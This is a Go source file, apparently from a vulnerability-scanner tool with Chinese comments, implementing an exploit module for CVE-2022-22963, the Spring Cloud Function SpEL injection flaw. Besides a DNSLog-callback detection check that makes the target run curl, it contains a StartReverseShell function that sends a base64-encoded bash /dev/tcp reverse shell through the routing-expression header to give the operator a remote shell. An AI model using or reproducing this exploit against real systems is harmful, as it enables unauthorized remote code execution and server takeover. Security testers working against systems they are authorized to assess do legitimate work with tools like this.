package vulns

import (
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
	cli "vuln-scanner/client"
	"vuln-scanner/common"
	"vuln-scanner/config"
	"vuln-scanner/logger"
)

type CVE202222963Scanner struct {
	statistics ScanStatistics // 扫描统计信息
	startTime  time.Time      // 扫描开始时间
}

func NewCVE202222963Scanner() *CVE202222963Scanner {
	return &CVE202222963Scanner{}
}

// GetScannerName 获取扫描器名称
func (s *CVE202222963Scanner) GetScannerName() string {
	return "cve_2022_22963_scanner"
}

// GetSupportedVulnerabilities 获取支持的漏洞类型
func (s *CVE202222963Scanner) GetSupportedVulnerabilities() []string {
	return []string{
		"CVE-2022-22963",
	}
}

// GetScanStatistics 获取扫描统计信息
func (s *CVE202222963Scanner) GetScanStatistics() ScanStatistics {
	// 确保更新扫描持续时间
	if s.statistics.ScanDuration == 0 && !s.startTime.IsZero() {
		s.statistics.ScanDuration = time.Since(s.startTime)
	}
	return s.statistics
}

// ExecuteCommand 执行命令
func (s *CVE202222963Scanner) ExecuteCommand(target string, command string, options ScanOptions) (string, error) {
	return "", fmt.Errorf("CVE-2022-22963不支持命令执行")
}

func (s *CVE202222963Scanner) bashBs64(ip, port string) string {
	// 步骤1: 生成原始bash反弹shell命令
	reverseShell := fmt.Sprintf("bash -i >&/dev/tcp/%s/%s 0>&1", ip, port)

	// 步骤2: Base64编码
	encodedCmd := base64.StdEncoding.EncodeToString([]byte(reverseShell))

	// 步骤3: 构建bash -c命令
	cmd := fmt.Sprintf("bash -c {echo,%s}|{base64,-d}|{bash,-i}", encodedCmd)

	// 步骤4: 包装为Java Runtime.exec调用
	payload := fmt.Sprintf("T(java.lang.Runtime).getRuntime().exec(\"%s\")", cmd)

	return payload

}

// StartReverseShell 启动反弹shell
func (s *CVE202222963Scanner) StartReverseShell(target string, host string, port string, options ScanOptions) (string, error) {
	log := options.Logger
	if log == nil {
		log = logger.NewDefaultLogger()
	}

	baseCtx := logger.LogContext{
		Target:      target,
		ScannerName: s.GetScannerName(),
		Timestamp:   time.Now(),
	}

	log.Info("CVE-2022-22963启动反弹shell", baseCtx)
	log.LogScanStep("CVE-2022-22963反弹shell参数", map[string]interface{}{
		"host": host,
		"port": port,
	}, baseCtx)

	httpclient, err := cli.CreateHTTPClient(options.Proxy, options.SkipSSL, options.AllowRedirect, time.Duration(options.Timeout)*time.Second)
	if err != nil {
		return "", fmt.Errorf("创建HTTP客户端失败: %w", err)
	}
	// bashCmd, err := s.bashBs64(host, port)
	// if err != nil {
	// 	return "", fmt.Errorf("构建bash命令失败: %w", err)
	// }
	// 构造反弹shell载荷
	payload := s.bashBs64(host, port)

	// 尝试不同的路径
	paths := []string{
		"/functionRouter",
	}

	fullURL := fmt.Sprintf("%s%s", strings.TrimRight(target, "/"), paths[0])

	log.LogScanStep("CVE-2022-22963反弹shell路径", map[string]interface{}{
		"URL":     fullURL,
		"path":    paths[0],
		"payload": payload,
	}, baseCtx)

	req, err := http.NewRequest(http.MethodPost, fullURL, strings.NewReader("onion"))
	if err != nil {
		return "", fmt.Errorf("创建POST请求失败: %w", err)
	}

	// req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header["spring.cloud.function.routing-expression"] = []string{payload}

	go func() {
		resp, err := httpclient.Do(req)
		if err != nil {
			log.Error(fmt.Sprintf("POST请求失败: %v", err), err, baseCtx)
			return
		}
		defer resp.Body.Close()
	}()

	return fmt.Sprintf("Shell反弹请求已发送,请检查你的Netcat监听结果。\n监听地址: %s:%s\n\n提示：\n1. 反弹shell命令已启动\n2. 如果连接成功，你应该能在netcat中看到shell提示符\n3. 请确保你的监听端口是开放的\n", host, port), nil
}

// GetMemoryShellTypes 获取支持的内存马类型
func (s *CVE202222963Scanner) GetMemoryShellTypes() ([]map[string]string, error) {
	return []map[string]string{}, nil
}

// InjectMemoryShell 注入内存马
func (s *CVE202222963Scanner) InjectMemoryShell(target string, password string, path string, shellType string, options ScanOptions) (string, error) {
	return "", fmt.Errorf("CVE-2022-22963不支持注入内存马")
}

// GetSupportedFeatures 获取支持的功能
func (s *CVE202222963Scanner) GetSupportedFeatures() []string {
	return []string{"shell"} // 只支持反弹shell
}

func (s *CVE202222963Scanner) Scan(ctx context.Context, target string, options ScanOptions) ([]common.Vulnerability, error) {
	var vulnerabilities []common.Vulnerability

	// 初始化统计信息
	s.statistics = ScanStatistics{}
	s.startTime = time.Now()

	// 获取或创建Logger
	log := options.Logger
	if log == nil {
		log = logger.NewDefaultLogger()
	}
	// 创建日志上下文
	baseCtx := logger.LogContext{
		Target:      target,
		ScannerName: s.GetScannerName(),
		Timestamp:   time.Now(),
	}

	// 检查DNS Log是否启用
	dnsLogEnabled := options.CeyeDNSLog != nil && options.CeyeDNSLog.Enabled && options.CeyeDNSLog.Token != "" && options.CeyeDNSLog.Domain != ""

	// 生成唯一的DNS子域名
	var dnsSubdomain string
	var randomStr = config.GenerateRandomString(8)
	var dnslogCfg *config.DNSLogCfg
	if dnsLogEnabled {
		log.Info("CEYE DNS Log功能已启用", baseCtx)
		dnsSubdomain = fmt.Sprintf("%s.%s", randomStr, options.CeyeDNSLog.Domain)
		log.Debug(fmt.Sprintf("生成DNS子域名: %s", dnsSubdomain), baseCtx)
	} else {
		log.Info("CEYE DNS Log功能未启用，请检查配置config.json，确保已配置CEYE_TOKEN和CEYE_DOMAIN，以及CEYE_DNSLOG_ENABLED为true！", baseCtx)
		log.Info("本次扫描将将采用DNSLOG.CN验证", baseCtx)
		var err error
		dnslogCfg, err = config.NewDNSLogCfg(options.Proxy, options.SkipSSL, options.AllowRedirect, time.Duration(options.Timeout)*time.Second)
		if err != nil {
			return nil, fmt.Errorf("创建DNSLogCfg失败: %w", err)
		}
		dnsSubdomain, err = dnslogCfg.GetDNSLog()
		if err != nil {
			return nil, fmt.Errorf("获取DNSLog域名失败: %w", err)
		}
		log.Debug(fmt.Sprintf("获取DNSLog域名: %s", dnsSubdomain), baseCtx)
	}

	log.Info("开始CVE-2022-22963漏洞扫描", baseCtx)
	log.LogScanStep("初始化扫描器", map[string]interface{}{
		"timeout":       options.Timeout,
		"proxy":         options.Proxy != "",
		"randomAgent":   options.RandomAgent,
		"dnsLogEnabled": dnsLogEnabled,
		"dnsSubdomain":  dnsSubdomain,
		"ceyeToken":     options.CeyeDNSLog.Token,
	}, baseCtx)

	// 检查上下文是否已取消
	select {
	case <-ctx.Done():
		err := &ScanError{
			Type:    ErrorTypeTimeout,
			Message: "扫描上下文已取消",
			Target:  target,
			Err:     ctx.Err(),
		}
		log.Error("扫描被取消", err, baseCtx)
		return nil, err
	default:
	}

	// 创建HTTP客户端
	clientConfig := cli.HTTPClientConfig{
		Timeout:   time.Duration(options.Timeout) * time.Second,
		Proxy:     options.Proxy,
		SkipSSL:   options.SkipSSL,
		UserAgent: "",
		Headers:   options.Headers,
		Cookies:   options.Cookies,
	}
	if options.RandomAgent {
		clientConfig.UserAgent = cli.GetRandomUserAgent()
		log.Debug(fmt.Sprintf("使用随机User-Agent: %s", clientConfig.UserAgent), baseCtx)
	}

	client, err := cli.NewHTTPClient(clientConfig)
	if err != nil {
		log.Error("创建HTTP客户端失败", err, baseCtx)
		return nil, &ScanError{
			Type:    ErrorTypeConfig,
			Message: "创建HTTP客户端失败",
			Target:  target,
			Err:     err,
		}
	}

	log.LogScanStep("HTTP客户端创建成功", map[string]interface{}{
		"timeout": options.Timeout,
		"proxy":   options.Proxy != "",
		"skipSSL": options.SkipSSL,
	}, baseCtx)

	// CVE-2022-22963: Spring Cloud Function SpEL RCE
	log.LogScanStep("开始CVE-2022-22963扫描", map[string]interface{}{
		"description":  "Spring Cloud Function远程代码执行漏洞, 无回显，依赖DNS Log验证",
		"attackMethod": "通过HTTP请求头注入SpEL表达式,利用Spring Expression Language (SpEL) 表达式执行任意代码",
		"cve":          "CVE-2022-22963",
		"year":         "2022",
	}, baseCtx)

	log.LogScanStep("生成DNSLog子域名", map[string]interface{}{
		"fullDomain": dnsSubdomain,
		"randomStr":  randomStr,
	}, baseCtx)

	// 生成执行命令
	command := fmt.Sprintf("curl %s", dnsSubdomain)
	payload := fmt.Sprintf("T(java.lang.Runtime).getRuntime().exec(\"%s\")", command)

	// 尝试不同的路径
	paths := []string{
		"/functionRouter",
	}

	fullURL := fmt.Sprintf("%s%s", strings.TrimRight(target, "/"), paths[0])
	startTime := time.Now()
	resp, bodyBytes, err := s.sendVulnerabilityRequestWithContext(ctx, client.GetHTTPClient(), fullURL, payload, "test")
	duration := time.Since(startTime)
	log.LogScanStep("发送漏洞请求", map[string]interface{}{
		"url":      fullURL,
		"payload":  payload,
		"duration": duration,
	}, baseCtx)

	if err != nil {
		log.Error("发送漏洞请求失败", err, baseCtx)
		return nil, &ScanError{
			Type:    "CVE-2022-22963",
			Message: "发送漏洞请求失败",
			Target:  target,
			Err:     err,
		}
	}

	// 记录响应
	respHeaders := make(map[string]string)
	for k, v := range resp.Header {
		if len(v) > 0 {
			respHeaders[k] = v[0]
		}
	}

	log.LogResponse(resp.StatusCode, respHeaders, bodyBytes, duration, baseCtx)

	if resp.StatusCode == 500 && strings.Contains(string(bodyBytes), `"error":"Internal Server Error"`) {
		log.LogScanStep("响应包含Internal Server Error，等待查询dnslog结果", map[string]interface{}{
			"statusCode": resp.StatusCode,
			"body":       string(bodyBytes),
		}, baseCtx)
		// 等待DNS查询
		waitTime := 3 * time.Second // 优化：减少等待时间
		log.LogScanStep("等待DNS查询回显", map[string]interface{}{
			"waitTime":  waitTime,
			"subdomain": dnsSubdomain,
			"randomStr": randomStr,
		}, baseCtx)

		time.Sleep(waitTime)

		// 检查DNSLog记录
		log.LogScanStep("检查DNSLog记录", map[string]interface{}{
			"randomStr":  randomStr,
			"fullDomain": dnsSubdomain,
		}, baseCtx)

		// **关键修复点4**: 改进DNSLog检查
		var hasRecord bool
		var err error
		var result string
		var dnsRecords []config.DNSLogRecord
		if !dnsLogEnabled {
			result, err = dnslogCfg.GetResult()
			if err != nil {
				log.Error("获取DNSLOG.CN结果失败", err, baseCtx)
			}
			if result != "" {
				hasRecord = true
				dnsRecords = append(dnsRecords, config.DNSLogRecord{
					Name:       dnsSubdomain,
					RemoteAddr: result,
					CreatedAt:  time.Now().Format(time.RFC3339),
				})
			}
		} else {
			hasRecord, dnsRecords, err = config.CheckDNSLogRecord(options.CeyeDNSLog, &clientConfig, dnsSubdomain)
			if err != nil {
				log.Error("检查CEYE DNSLog记录失败", err, baseCtx)
				return nil, err
			}
			for _, record := range dnsRecords {
				if record.Name == dnsSubdomain {
					hasRecord = true
					break
				}
			}
		}
		if err != nil {
			log.Error("检查DNSLog记录失败", err, baseCtx)
			return vulnerabilities, nil
		} else {
			if hasRecord && len(dnsRecords) > 0 {
				log.Info("DNSLog记录存在", baseCtx)
				// 详细记录DNSLog信息
				for i, record := range dnsRecords {
					log.LogScanStep(fmt.Sprintf("DNSLog记录%d", i+1), map[string]interface{}{
						"name":       record.Name,
						"remoteAddr": record.RemoteAddr,
						"createdAt":  record.CreatedAt,
					}, baseCtx)
				}

				// 创建漏洞记录
				vulnProof := fmt.Sprintf("DNSLog验证成功: %s -> %s (路径: %s)",
					dnsRecords[0].Name, dnsRecords[0].RemoteAddr, fullURL)

				responseContent := string(bodyBytes)
				if len(responseContent) > 500 {
					responseContent = responseContent[:500] + "...[截断]"
				}

				vulnerability := common.Vulnerability{
					ID:                len(vulnerabilities) + 1,
					VulnerabilityType: "CVE-2022-22963",
					Severity:          "严重",
					Target:            target,
					URL:               strings.TrimRight(target, "/") + paths[0],
					Payload:           payload,
					Description:       "Spring Cloud Function存在SpEL表达式注入漏洞。攻击者可以通过spring.cloud.function.routing-expression请求头注入恶意SpEL表达式，导致远程代码执行(RCE)。",
					Proof:             vulnProof,
					Recommendation:    "1. 升级Spring Cloud Function至安全版本（3.1.7+或3.2.3+）\n2. 将StandardEvaluationContext替换为SimpleEvaluationContext\n3. 在application.properties中设置spring.cloud.function.spel.enabled=false\n4. 配置Web应用防火墙过滤恶意请求头",
					ResponseHeaders:   respHeaders,
					ResponseContent:   responseContent,
					Timestamp:         time.Now(),
				}

				vulnerabilities = append(vulnerabilities, vulnerability)
				log.LogVulnerabilityFound(vulnerability, baseCtx)
			} else if hasRecord && len(dnsRecords) == 0 {
				log.Warn("DNSLog记录存在但为空", baseCtx)
			} else {
				log.Info("未发现DNSLog记录", baseCtx)

			}
		}

	} else {
		// 优化：当响应状态码不是500时，直接返回，不进行DNS查询
		log.Info(fmt.Sprintf("响应状态码为 %d，不是预期的500，直接返回", resp.StatusCode), baseCtx)
		return vulnerabilities, nil
	}

	// 更新统计信息
	s.statistics.ScanDuration = time.Since(s.startTime)
	s.statistics.VulnerabilitiesFound = len(vulnerabilities)
	s.statistics.TotalRequests = 1

	log.Info(fmt.Sprintf("扫描统计[扫描耗时: %v, 发现漏洞数: %d, 总请求数: %d]",
		s.statistics.ScanDuration, s.statistics.VulnerabilitiesFound, s.statistics.TotalRequests), baseCtx)

	// 调用扫描完成回调
	if options.Callbacks != nil && options.Callbacks.OnScanComplete != nil {
		options.Callbacks.OnScanComplete(vulnerabilities)
	}

	// 返回扫描结果
	return vulnerabilities, nil
}

// sendVulnerabilityRequestWithContext 发送漏洞利用请求（支持上下文管理）
func (s *CVE202222963Scanner) sendVulnerabilityRequestWithContext(ctx context.Context, client *http.Client, url, payload, body string) (*http.Response, []byte, error) {
	// 构建请求
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(body))
	if err != nil {
		return nil, nil, err
	}

	// 设置请求头
	// 这样可以保持原始的大小写
	req.Header["spring.cloud.function.routing-expression"] = []string{payload}
	req.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
	req.Header["Accept"] = []string{"*/*"}
	req.Header["User-Agent"] = []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

	// 添加额外的请求头
	req.Header["Accept-Encoding"] = []string{"gzip, deflate"}
	req.Header["Accept-Language"] = []string{"en"}

	// 发送请求
	resp, err := client.Do(req)
	if err != nil {
		return nil, nil, err
	}

	// 读取响应
	defer resp.Body.Close()
	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return resp, nil, err
	}

	return resp, bodyBytes, nil
}
